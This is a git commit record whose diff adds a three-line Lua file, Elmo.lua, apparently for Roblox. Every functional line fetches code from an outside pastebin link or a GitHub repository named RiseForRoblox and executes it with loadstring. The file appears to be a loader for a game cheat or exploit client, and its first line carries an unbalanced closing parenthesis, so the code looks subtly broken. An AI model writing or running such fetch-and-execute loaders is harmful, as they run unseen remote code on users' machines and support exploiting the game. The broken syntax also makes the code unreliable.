62162296959396b250bf3ed0bf0ad7bb7fb8064b
BloodMaK <103873864+BloodMaK@users.noreply.github.com>
2022-05-12 12:40:17 +0800

    Update and rename Main.Lua to Elmo.lua

---
+++ Elmo.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/sVuGg3fi"))())
+wait(3)
+pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/RiseForRoblox/main/main.lua"))())
